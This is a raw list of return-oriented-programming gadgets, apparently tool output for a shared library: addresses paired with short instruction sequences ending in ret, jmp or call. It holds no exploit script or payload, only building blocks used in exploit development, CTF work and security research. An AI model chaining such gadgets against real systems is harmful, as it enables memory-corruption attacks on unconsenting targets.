0x00002aaaaac5ca8d : jns 0x187a84 ; jmp rdx
0x00002aaaaac5ca91 : jns 0x187a88 ; jmp rdx
0x00002aaaaac5ca95 : jns 0x187a8c ; jmp rdx
0x00002aaaaac5ca99 : jns 0x187a90 ; jmp rdx
0x00002aaaaac5ca9d : jns 0x187a94 ; jmp rdx
0x00002aaaaac5caa1 : jns 0x187a98 ; jmp rdx
0x00002aaaaac5caa5 : jns 0x187a9c ; jmp rdx
0x00002aaaaac5caa9 : jns 0x187aa0 ; jmp rdx
0x00002aaaaac5caad : jns 0x187aa4 ; jmp rdx
0x00002aaaaac5cab1 : jns 0x187aa8 ; jmp rdx
0x00002aaaaac5cab5 : jns 0x187aac ; jmp rdx
0x00002aaaaac5cab9 : jns 0x187ab0 ; jmp rdx
0x00002aaaaac5cabd : jns 0x187ab4 ; jmp rdx
0x00002aaaaac5cac1 : jns 0x187ab8 ; jmp rdx
0x00002aaaaac5cac5 : jns 0x187abc ; jmp rdx
0x00002aaaaac5cac9 : jns 0x187ac0 ; jmp rdx
0x00002aaaaac5cacd : jns 0x187ac4 ; jmp rdx
0x00002aaaaac5cad1 : jns 0x187ac8 ; jmp rdx
0x00002aaaaac5cad5 : jns 0x187acc ; jmp rdx
0x00002aaaaac5cad9 : jns 0x187ad0 ; jmp rdx
0x00002aaaaac5cadd : jns 0x187ad4 ; jmp rdx
0x00002aaaaac5cb09 : jns 0x187b00 ; jmp rdx
0x00002aaaaac5cb0d : jns 0x187b04 ; jmp rdx
0x00002aaaaac5cb11 : jns 0x187b0c ; push qword ptr [rdi + rax*4 - 0xd] ; jmp rdx
0x00002aaaaac5cb21 : jns 0x187b18 ; jmp rdx
0x00002aaaaac5cb19 : jns 0x187b18 ; ljmp ptr [rax + rcx*4 + 0x79e2fff3] ; jmp rdx
0x00002aaaaac5cb4d : jns 0x187b44 ; jmp rdx
0x00002aaaaac5cb51 : jns 0x187b48 ; jmp rdx
0x00002aaaaac5cb55 : jns 0x187b4c ; jmp rdx
0x00002aaaaac5cb59 : jns 0x187b50 ; jmp rdx
0x00002aaaaac5cb5d : jns 0x187b54 ; jmp rdx
0x00002aaaaac5cb79 : jns 0x187b78 ; lcall ptr [rdx + 0x42fff383] ; mov dh, bl ; jmp rdx
0x00002aaaaac5cb9d : jns 0x187b98 ; dec dword ptr [rbx - 0x7e] ; jmp rdx
0x00002aaaaac5cf34 : jns 0x187ee3 ; jmp qword ptr [rdi]
0x00002aaaaac5d258 : jns 0x188238 ; dec ecx ; fcompi st(3) ; ljmp ptr [rdx - 0x2d] ; call qword ptr [rcx]
0x00002aaaaac5d770 : jns 0x1887c7 ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5ecc9 : jns 0x189cc3 ; jmp qword ptr [rdx]
0x00002aaaaac5ecd1 : jns 0x189ccb ; jmp qword ptr [rdx]
0x00002aaaaac5ed39 : jns 0x189d33 ; jmp qword ptr [rdx]
0x00002aaaaac5ed38 : jns 0x189d34 ; jmp qword ptr [rdx]
0x00002aaaaac5ed6d : jns 0x189d67 ; jmp qword ptr [rdx]
0x00002aaaaac69361 : jns 0x194364 ; jmp qword ptr [rax + 0x20fffb7a]
0x00002aaaaac6a33d : jns 0x19533d ; jmp qword ptr [rdx]
0x00002aaaaac6a3fd : jns 0x195405 ; inc dword ptr [rcx + rdi*2] ; cld ; push qword ptr [rax + rdi*2 - 4] ; jmp rsp
0x00002aaaaac6a401 : jns 0x195405 ; push qword ptr [rax + rdi*2 - 4] ; jmp rsp
0x00002aaaaac6a4bd : jns 0x1954bd ; jmp rax
0x00002aaaaac72211 : jns 0x19d1fe ; jmp qword ptr [rcx]
0x00002aaaaac72210 : jns 0x19d1ff ; jmp qword ptr [rcx]
0x00002aaaaac72241 : jns 0x19d22e ; call qword ptr [rdx]
0x00002aaaaac72259 : jns 0x19d246 ; call qword ptr [rdx]
0x00002aaaaac78849 : jns 0x1a383a ; jmp qword ptr [rcx]
0x00002aaaaaad6b2d : jns 0x1b38 ; ret
0x00002aaaaaaf5490 : jns 0x20380 ; jmp 0x20461
0x00002aaaaaafeae4 : jns 0x29d4cceb ; ret
0x00002aaaaaad7be3 : jns 0x2bb1 ; clc ; ret
0x00002aaaaaad8267 : jns 0x3242 ; ret 0x5a51
0x00002aaaaaad88ef : jns 0x3942 ; cmpsq qword ptr [rsi], qword ptr [rdi] ; ret 0x49ec
0x00002aaaaab2aa53 : jns 0x55a6c ; add al, byte ptr [rax] ; add rsp, 0xd8 ; ret
0x00002aaaaab411ce : jns 0x6c1ea ; mov dh, 0xc0 ; movsxd rax, dword ptr [rsi + rax*4] ; add rax, rsi ; jmp rax
0x00002aaaaab5d9db : jns 0x8898a ; xor eax, dword ptr [rax] ; mov qword ptr [rsp], rax ; call qword ptr [rdx]
0x00002aaaaab73f37 : jns 0x9ef3a ; ret
0x00002aaaaab74171 : jns 0x9f174 ; ret
0x00002aaaaab742d8 : jns 0x9f2e3 ; ret
0x00002aaaaab7468a : jns 0x9f68d ; ret
0x00002aaaaab748c4 : jns 0x9f8c7 ; ret
0x00002aaaaab74a2b : jns 0x9fa36 ; ret
0x00002aaaaab74dd7 : jns 0x9fdda ; ret
0x00002aaaaab75011 : jns 0xa0014 ; ret
0x00002aaaaab75178 : jns 0xa0183 ; ret
0x00002aaaaaba5ffb : jns 0xd1012 ; add byte ptr [rdx + 0x63], cl ; adc al, 0xb0 ; add rax, rdx ; jmp rax
0x00002aaaaabac0c6 : jns 0xd70d6 ; add dh, byte ptr [rbp - 0x2b] ; jmp 0xd7096
0x00002aaaaabd2074 : jns 0xfd082 ; mov byte ptr [rbx], 0 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaabd3746 : jns 0xfe77c ; add byte ptr [rcx - 0x3a], al ; inc dword ptr [rax] ; ret
0x00002aaaaac0c170 : jns 0xffffffffc496ba57 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab7e096 : jns 0xffffffffed3a93fc ; mov byte ptr [rdi + 7], ch ; ret
0x00002aaaaab7e0f8 : jns 0xffffffffed3a985e ; mov byte ptr [rdi + 0xb], ch ; ret
0x00002aaaaab7e118 : jns 0xffffffffed3a997e ; mov byte ptr [rdi + 0xc], ch ; ret
0x00002aaaaac06e92 : jo 0x131ef9 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaac07763 : jo 0x1327c9 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaac0b272 : jo 0x1362d1 ; ret
0x00002aaaaac33507 : jo 0x15e517 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac3374a : jo 0x15e75a ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac4435c : jo 0x16f3ba ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaac485bb : jo 0x17360b ; mov edi, dword ptr [rbx] ; call 0x1f8ae
0x00002aaaaac49c9c : jo 0x174d1b ; jmp 0x174caa
0x00002aaaaac58244 : jo 0x1832be ; mov ebp, 0xfb67d10d ; ret
0x00002aaaaac5c1bc : jo 0x1871b1 ; int1 ; call qword ptr [rax - 0x4f000e18]
0x00002aaaaac5c1dc : jo 0x1871d2 ; int1 ; call qword ptr [rax - 0x4f000e17]
0x00002aaaaac5c1fc : jo 0x1871f3 ; int1 ; call qword ptr [rax - 0x4f000e16]
0x00002aaaaac5c218 : jo 0x18720c ; int1 ; jmp qword ptr [rax - 0x2f000e15]
0x00002aaaaac5c404 : jo 0x18740e ; jmp qword ptr [rax - 0x2f000dff]
0x00002aaaaac6921c : jo 0x194227 ; sti ; inc dword ptr [rax + 3] ; sti ; call qword ptr [rax]
0x00002aaaaac69328 : jo 0x194395 ; sti ; inc eax ; sti ; call qword ptr [rax]
0x00002aaaaac697c0 : jo 0x194799 ; sti ; inc eax ; sar ebx, 1 ; call qword ptr [rax]
0x00002aaaaac69938 : jo 0x194936 ; sti ; inc eax ; idiv bl ; call qword ptr [rax]
0x00002aaaaac6998c : jo 0x194991 ; sti ; dec dword ptr [rax + 0x28] ; cld ; call qword ptr [rax]
0x00002aaaaac69b04 : jo 0x194b2e ; cld ; inc eax ; and bh, ah ; call qword ptr [rax]
0x00002aaaaac69b18 : jo 0x194b34 ; cld ; inc eax ; adc al, 0xfc ; call qword ptr [rax]
0x00002aaaaac69d7c : jo 0x194de6 ; cld ; inc dword ptr [rax] ; pop rbp ; cld ; call qword ptr [rax + 0x20fffc5c]
0x00002aaaaac69f8c : jo 0x194fea ; cld ; inc dword ptr [rax] ; push rcx ; cld ; jmp qword ptr [rax + 0x20fffc58]
0x00002aaaaac6a268 : jo 0x1951fa ; cld ; inc dword ptr [rax] ; test edi, esp ; call qword ptr [rax + 0x20fffc84]
0x00002aaaaac6a760 : jo 0x195719 ; cld ; inc dword ptr [rax] ; lodsb al, byte ptr [rsi] ; cld ; call qword ptr [rax + 0x20fffcab]
0x00002aaaaac6a7c0 : jo 0x195764 ; cld ; jmp rax
0x00002aaaaac6a7b8 : jo 0x195765 ; cld ; push rax ; lahf ; cld ; push qword ptr [rax - 0x61] ; cld ; jmp rax
0x00002aaaaac6a9c4 : jo 0x195967 ; cld ; jmp rax
0x00002aaaaac6ad11 : jo 0x195d06 ; dec esp ; imul eax, dword ptr [rax], 0xe9710400 ; jmp rsp
0x00002aaaaac76f0b : jo 0x1a1f16 ; mov ebp, 0x41380e0a ; ret
0x00002aaaaac7aa79 : jo 0x1a5a6b ; jmp qword ptr [rdx]
0x00002aaaaac7b990 : jo 0x1a6a08 ; out dx, eax ; call rax
0x00002aaaaac7f0e0 : jo 0x1aa0fa ; jmp qword ptr [rcx]
0x00002aaaaac804f8 : jo 0x1ab506 ; ret
0x00002aaaaac82e60 : jo 0x1ade44 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac84f01 : jo 0x1afefa ; jmp qword ptr [rcx]
0x00002aaaaac84f19 : jo 0x1aff12 ; jmp qword ptr [rcx]
0x00002aaaaac84f31 : jo 0x1aff2a ; jmp qword ptr [rcx]
0x00002aaaaac84f30 : jo 0x1aff2b ; jmp qword ptr [rcx]
0x00002aaaaac84f79 : jo 0x1aff72 ; jmp qword ptr [rcx]
0x00002aaaaac84f91 : jo 0x1aff8a ; jmp qword ptr [rcx]
0x00002aaaaac857b0 : jo 0x1b073a ; cmc ; jmp rax
0x00002aaaaac86f55 : jo 0x1b1f5e ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac86f85 : jo 0x1b1f8e ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac86f84 : jo 0x1b1f8f ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac86fb5 : jo 0x1b1fbe ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac86ffd : jo 0x1b2006 ; add al, ah ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac87015 : jo 0x1b201e ; add al, bh ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac8702d : jo 0x1b2036 ; add byte ptr [rax], dl ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaaad75aa : jo 0x25a2 ; scasd eax, dword ptr [rdi] ; xchg eax, esi ; add byte ptr [rdx], al ; xchg dh, ch ; ret 0x88ad
0x00002aaaaaafe2a6 : jo 0x292be ; mov dh, 0x4a ; dec dword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaab030b3 : jo 0x2e104 ; movsxd rdi, edi ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaab030b2 : jo 0x2e105 ; movsxd rdi, edi ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaab16923 : jo 0x418b7 ; sar dword ptr [rdx + 1], -0x77 ; ret
0x00002aaaaab1a096 : jo 0x450a1 ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab35dbc : jo 0x60d49 ; ret
0x00002aaaaab46c7a : jo 0x71c92 ; mov qword ptr [rax + 0x40], rcx ; ret
0x00002aaaaab4aada : jo 0x75a67 ; sar byte ptr [rax + 9], 0xf3 ; ret
0x00002aaaaab4aad9 : jo 0x75a68 ; sar byte ptr [rax + 9], 0xf3 ; ret
0x00002aaaaab4e834 : jo 0x79885 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab816e4 : jo 0xac732 ; mov edi, ebp ; call rbx
0x00002aaaaab81c6e : jo 0xaccc0 ; mov edi, esp ; call rbx
0x00002aaaaab8e9cc : jo 0xb99e0 ; xchg eax, ebp ; ret 0x8b4c
0x00002aaaaab9457a : jo 0xbf583 ; jmp 0xbf36f
0x00002aaaaabb7425 : jo 0xe2417 ; push rbp ; jno 0xe2431 ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaabb8288 : jo 0xe327a ; loop 0xe330c ; cli ; dec dword ptr [rcx - 0x77] ; ret 0x448b
0x00002aaaaabc858c : jo 0xf3599 ; mov qword ptr [rdi], rax ; mov rdi, rbx ; call 0x1f7fa
0x00002aaaaabe7735 : jp 0x11278c ; mov rsi, rdx ; call rax
0x00002aaaaabe8fb2 : jp 0x114005 ; sub eax, dword ptr [rax] ; test eax, eax ; jne 0x113fca ; xor eax, eax ; ret
0x00002aaaaac02bdd : jp 0x12dc3d ; mov qword ptr [rdx + 0x68], rcx ; ret
0x00002aaaaac06742 : jp 0x13174e ; ret
0x00002aaaaac094b2 : jp 0x1344be ; ret
0x00002aaaaac094ca : jp 0x1344d6 ; ret
0x00002aaaaac09d02 : jp 0x134d0e ; ret
0x00002aaaaac09d1a : jp 0x134d26 ; ret
0x00002aaaaac09d4a : jp 0x134d56 ; ret
0x00002aaaaac188b2 : jp 0x14390c ; sub byte ptr [rax], al ; test eax, eax ; jne 0x1438ca ; xor eax, eax ; ret
0x00002aaaaac21e86 : jp 0x14ce7a ; ret
0x00002aaaaac21ee9 : jp 0x14cedd ; ret
0x00002aaaaac21e7f : jp 0x14cf09 ; jb 0x14ce6c ; vmovdqu xmmword ptr [rdx - 0x10], xmm15 ; ret
0x00002aaaaac21e84 : jp 0x14cf09 ; jp 0x14ce7c ; ret
0x00002aaaaac22376 : jp 0x14d36a ; ret
0x00002aaaaac223d9 : jp 0x14d3cd ; ret
0x00002aaaaac2236f : jp 0x14d3f9 ; jb 0x14d35c ; vmovdqu xmmword ptr [rdx - 0x10], xmm15 ; ret
0x00002aaaaac22374 : jp 0x14d3f9 ; jp 0x14d36c ; ret
0x00002aaaaac22719 : jp 0x14d70d ; ret
0x00002aaaaac22779 : jp 0x14d76d ; ret
0x00002aaaaac22712 : jp 0x14d79c ; jb 0x14d6ff ; vmovdqu xmmword ptr [rdx - 0x10], xmm15 ; ret
0x00002aaaaac22717 : jp 0x14d79c ; jp 0x14d70f ; ret
0x00002aaaaac32a8e : jp 0x15da9e ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac32cca : jp 0x15dcda ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac5ec09 : jp 0x189c03 ; jmp rdx
0x00002aaaaac5ec11 : jp 0x189c0b ; jmp rdx
0x00002aaaaac5ecad : jp 0x189ca7 ; jmp rdx
0x00002aaaaac5ecf1 : jp 0x189ceb ; jmp qword ptr [rdx]
0x00002aaaaac5ed31 : jp 0x189d2b ; jmp qword ptr [rdx]
0x00002aaaaac69365 : jp 0x194364 ; jmp qword ptr [rax]
0x00002aaaaac6a2b9 : jp 0x1952b9 ; call rax
0x00002aaaaac6a335 : jp 0x195335 ; jmp qword ptr [rdx]
0x00002aaaaac6a339 : jp 0x19533d ; jmp qword ptr [rdx + 0x22fffc79]
0x00002aaaaac6a4b5 : jp 0x1954b5 ; jmp rax
0x00002aaaaac85551 : jp 0x1b054a ; jmp qword ptr [rcx]
0x00002aaaaac85569 : jp 0x1b0562 ; jmp qword ptr [rcx]
0x00002aaaaac85581 : jp 0x1b057a ; jmp qword ptr [rcx]
0x00002aaaaac85599 : jp 0x1b0592 ; jmp qword ptr [rcx]
0x00002aaaaac90771 : jp 0x1bb76d ; call qword ptr [rcx]
0x00002aaaaaaf8653 : jp 0x2366d ; mov qword ptr [rbp - 0x58], rdx ; call 0x1f8a8
0x00002aaaaaad7561 : jp 0x2545 ; jmp qword ptr [rbx]
0x00002aaaaaad7560 : jp 0x2546 ; jmp qword ptr [rbx]
0x00002aaaaab01b28 : jp 0x2cb6b ; jae 0x2cb48 ; mov rax, qword ptr [rdx + rdi*8 + 0x40] ; ret
0x00002aaaaab09e06 : jp 0x34e23 ; movaps xmm0, xmm1 ; jne 0x34e23 ; add rsp, 0x28 ; ret
0x00002aaaaaad8956 : jp 0x39d0 ; xchg eax, ebx ; and cl, ah ; ret
0x00002aaaaab47fe9 : jp 0x7302e ; jmp 0x72fb3
0x00002aaaaab62b8a : jp 0x8dc14 ; xor eax, dword ptr [rax] ; add rsp, 0x100 ; ret
0x00002aaaaab63805 : jp 0x8e7ff ; ret 0x7401
0x00002aaaaab8fa91 : jp 0xbaaa6 ; pop rbp ; pop r12 ; pop r14 ; ret
0x00002aaaaabc7279 : jp 0xf228e ; add byte ptr [rax + 0x63], cl ; or al, 0x8a ; add rdx, rcx ; jmp rdx
0x00002aaaaabc7278 : jp 0xf228f ; add byte ptr [rax + 0x63], cl ; or al, 0x8a ; add rdx, rcx ; jmp rdx
0x00002aaaaabe9503 : jrcxz 0x1144c8 ; cmp r11d, 0xa ; je 0x114514 ; ret
0x00002aaaaac0eb9f : jrcxz 0x139be4 ; call rsi
0x00002aaaaac2b594 : jrcxz 0x1565a4 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac2b64b : jrcxz 0x15665b ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac2f06a : jrcxz 0x15a065 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac2f069 : jrcxz 0x15a066 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31b3a : jrcxz 0x15cb35 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31b39 : jrcxz 0x15cb36 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac3465a : jrcxz 0x15f655 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac34659 : jrcxz 0x15f656 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac485b7 : jrcxz 0x17360c ; add ebx, dword ptr [rbp + 0x70] ; mov rdi, qword ptr [rbx] ; call 0x1f8b2
0x00002aaaaac57025 : jrcxz 0x18207f ; ret
0x00002aaaaac69629 : jrcxz 0x19462c ; call qword ptr [rax + 0x20fffbe5]
0x00002aaaaac69689 : jrcxz 0x194688 ; jmp qword ptr [rax]
0x00002aaaaac6e4d9 : jrcxz 0x1994d6 ; jmp qword ptr [rdx + rax*8 + 1]
0x00002aaaaac7c081 : jrcxz 0x1a7074 ; call rsp
0x00002aaaaac82ff1 : jrcxz 0x1adfe9 ; call qword ptr [rsi]
0x00002aaaaac82ff0 : jrcxz 0x1adfea ; call qword ptr [rsi]
0x00002aaaaac83009 : jrcxz 0x1ae001 ; jmp qword ptr [rcx]
0x00002aaaaac83008 : jrcxz 0x1ae002 ; jmp qword ptr [rcx]
0x00002aaaaac89f01 : jrcxz 0x1b4efb ; jmp qword ptr [rdi]
0x00002aaaaab02cbe : jrcxz 0x2dcda ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab25ebc : jrcxz 0x50f35 ; ret 0x8945
0x00002aaaaab28b2e : jrcxz 0x53ba7 ; ret
0x00002aaaaab2b7c8 : jrcxz 0x567c2 ; ret 0xf40
0x00002aaaaab98c1f : jrcxz 0xc3c38 ; test byte ptr [rdx - 0x16000016], bh ; ret 0xfff3
0x00002aaaaaba509e : jrcxz 0xd008b ; ret 0xfffb
0x00002aaaaabab750 : jrcxz 0xd675f ; je 0xd66ef ; pop rbx ; ret
0x00002aaaaabc3d3c : jrcxz 0xeed8e ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabda14f : js 0x1051af ; pop rbp ; ret
0x00002aaaaabda1bf : js 0x10521f ; pop rbp ; ret
0x00002aaaaabde8a8 : js 0x109834 ; loopne 0x1098bb ; movzx eax, ax ; ret
0x00002aaaaabde9d8 : js 0x109961 ; loopne 0x1099e1 ; ret
0x00002aaaaabdea68 : js 0x1099f4 ; loopne 0x109a75 ; movzx eax, ax ; ret
0x00002aaaaabded68 : js 0x109cf4 ; loopne 0x109d77 ; movzx eax, ax ; ret
0x00002aaaaabdf241 : js 0x10a1cd ; loopne 0x10a254 ; movzx eax, ax ; ret
0x00002aaaaabdf341 : js 0x10a2ca ; loopne 0x10a34a ; ret
0x00002aaaaabdf3c1 : js 0x10a34d ; loopne 0x10a3ce ; movzx eax, ax ; ret
0x00002aaaaabdf641 : js 0x10a5cd ; loopne 0x10a650 ; movzx eax, ax ; ret
0x00002aaaaabed7c4 : js 0x1187d9 ; mov eax, edi ; and eax, 0xffffff ; ret
0x00002aaaaabed844 : js 0x118857 ; mov eax, edi ; shr eax, 0x18 ; ret
0x00002aaaaac0139e : js 0x12c406 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaac07606 : js 0x13266e ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaac0762f : js 0x132697 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaac0c16f : js 0x13718a ; mov eax, ebx ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0c818 : js 0x13781c ; dec dword ptr [rdi] ; test byte ptr [rdi - 0x7d000000], al ; ret 0x3901
0x00002aaaaac0f72f : js 0x13a76d ; ror byte ptr [rax - 0x7d], 0xc4 ; and byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac150b3 : js 0x1400c8 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac1512c : js 0x14016b ; mov rax, qword ptr [rsp + 8] ; add rsp, 0x18 ; ret
0x00002aaaaac5cb04 : js 0x187b86 ; jmp rdx
0x00002aaaaac5cb90 : js 0x187c1a ; push qword ptr [rax + 0x6dfff381] ; jl 0x187b99 ; jmp rdx
0x00002aaaaac6a2c9 : js 0x1952cd ; jmp qword ptr [rax + 0x16fffc77]
0x00002aaaaac6a2c5 : js 0x1952cd ; push qword ptr [rax] ; js 0x1952d1 ; jmp qword ptr [rax + 0x16fffc77]
0x00002aaaaac6a405 : js 0x195405 ; jmp rsp
0x00002aaaaac6a485 : js 0x195485 ; call rax
0x00002aaaaac6a4c5 : js 0x1954cd ; inc eax ; ja 0x1954d1 ; push qword ptr [rax] ; ja 0x1954d5 ; call rax
0x00002aaaaac6c1f9 : js 0x1971eb ; call rsp
0x00002aaaaac71dd8 : js 0x19ce34 ; jmp 0x1b90e2
0x00002aaaaac7afb8 : js 0x1a5fd7 ; cli ; call qword ptr [rax]
0x00002aaaaac7d788 : js 0x1a87b2 ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac7d808 : js 0x1a8832 ; int1 ; call qword ptr [rcx]
0x00002aaaaac7e988 : js 0x1a9986 ; int1 ; call rsi
0x00002aaaaac81fb8 : js 0x1acf50 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac82658 : js 0x1ad605 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac85188 : js 0x1b0200 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85338 : js 0x1b03b3 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac853e9 : js 0x1b03e2 ; jmp qword ptr [rbx]
0x00002aaaaac85628 : js 0x1b06a8 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaaafab94 : js 0x25b9e ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xc985
0x00002aaaaaafb82b : js 0x26893 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaafb875 : js 0x268dd ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab02d11 : js 0x2dc9d ; loopne 0x2dd24 ; movzx eax, ax ; ret
0x00002aaaaab02d51 : js 0x2dcdd ; loopne 0x2dd5e ; movzx eax, ax ; ret
0x00002aaaaab02df1 : js 0x2dd7d ; loopne 0x2de00 ; movzx eax, ax ; ret
0x00002aaaaab02ed1 : js 0x2de5a ; loopne 0x2deda ; ret
0x00002aaaaab02f4a : js 0x2ded3 ; loopne 0x2df53 ; ret
0x00002aaaaab02f5a : js 0x2dee6 ; loopne 0x2df6d ; movzx eax, ax ; ret
0x00002aaaaab02f9a : js 0x2df26 ; loopne 0x2dfa7 ; movzx eax, ax ; ret
0x00002aaaaab0303a : js 0x2dfc6 ; loopne 0x2e049 ; movzx eax, ax ; ret
0x00002aaaaab030c3 : js 0x2e114 ; movsxd rdi, edi ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaab030c2 : js 0x2e115 ; movsxd rdi, edi ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaaad7f99 : js 0x2f4f ; sub ebx, dword ptr [rsp + rax*2] ; nop ; ret 0x5bdb
0x00002aaaaab096be : js 0x346f0 ; call 0x1f8b0
0x00002aaaaab1d6c0 : js 0x48728 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab4aadd : js 0x75aeb ; ret
0x00002aaaaab4d324 : js 0x7833a ; mov qword ptr [rbx + 0x90], rax ; pop rbx ; ret
0x00002aaaaab534fd : js 0x7e565 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab59c68 : js 0x84c73 ; ret
0x00002aaaaaba2047 : js 0xcd053 ; ret
0x00002aaaaaba9d4f : js 0xd4d21 ; or byte ptr [r9], r8b ; mov eax, 1 ; ret
0x00002aaaaabaa9cd : js 0xd5a35 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaabb5e96 : js 0xe0ea9 ; movsxd rdi, dword ptr [r11 + rdi*4] ; add rdi, r11 ; jmp rdi
0x00002aaaaabb828b : js 0xe328c ; dec dword ptr [rcx - 0x77] ; ret 0x448b
0x00002aaaaabb9558 : js 0xe456b ; add al, 0x75 ; mov bl, 0x8b ; pop rax ; or bh, dh ; ret
0x00002aaaaabba69c : js 0xe56e6 ; or al, byte ptr [rax] ; movsxd rdx, dword ptr [rax + rdx*4] ; add rax, rdx ; jmp rax
0x00002aaaaabca33c : js 0xf538e ; mov dword ptr [rdi + 0x80], edx ; ret
0x00002aaaaabcacd9 : js 0xf5d2b ; mov dword ptr [rdi + 0x100], edx ; ret
0x00002aaaaabd0734 : js 0xfb74a ; mov eax, dword ptr [rdi + 8] ; and eax, 0x100f ; ret
0x00002aaaaabd0b57 : js 0xfbb72 ; mov eax, dword ptr [rsp + 0xc] ; add rsp, 0x18 ; ret
0x00002aaaaabd0cf9 : js 0xfbd12 ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd113b : js 0xfc14e ; mov eax, 0x14 ; sub eax, edx ; ret
0x00002aaaaabd130b : js 0xfc2dd ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd3632 : js 0xfe645 ; mov qword ptr [rdi], rax ; mov qword ptr [rdi + 8], rsi ; ret
0x00002aaaaab7e038 : js 0xffffffffed3a929e ; mov byte ptr [rdi + 3], ch ; ret
0x00002aaaaab7e066 : js 0xffffffffed3a94cc ; mov byte ptr [rdi + 5], ch ; ret
0x00002aaaaab7e0b8 : js 0xffffffffed3a991e ; mov byte ptr [rdi + 9], ch ; ret
0x00002aaaaaaf9c23 : lahf ; add al, byte ptr [rax] ; add byte ptr [rcx], dh ; ror byte ptr [rcx + 0x39], cl ; ret 0x1e76
0x00002aaaaabff00c : lahf ; add dword ptr [rax], eax ; add byte ptr [rcx - 0x80], al ; stc ; cmp cl, byte ptr [rdi] ; xchg eax, ebp ; ret 0x8041
0x00002aaaaac89efd : lahf ; add dword ptr [rax], eax ; and bl, 0xf6 ; jmp qword ptr [rdi]
0x00002aaaaac30127 : lahf ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab03d81 : lahf ; and al, 0x15 ; add byte ptr [rax + 0x63], cl ; adc al, 0x88 ; add rax, rdx ; jmp rax
0x00002aaaaabd41a8 : lahf ; clc ; inc dword ptr [rbp - 0x7cee8b40] ; ret
0x00002aaaaac6a97d : lahf ; cld ; call qword ptr [rax]
0x00002aaaaac6a9bd : lahf ; cld ; inc dword ptr [rax] ; lahf ; cld ; push qword ptr [rax - 0x62] ; cld ; jmp rax
0x00002aaaaac6a7c1 : lahf ; cld ; jmp rax
0x00002aaaaac6a7bd : lahf ; cld ; push qword ptr [rax - 0x61] ; cld ; jmp rax
0x00002aaaaac6a9c1 : lahf ; cld ; push qword ptr [rax - 0x62] ; cld ; jmp rax
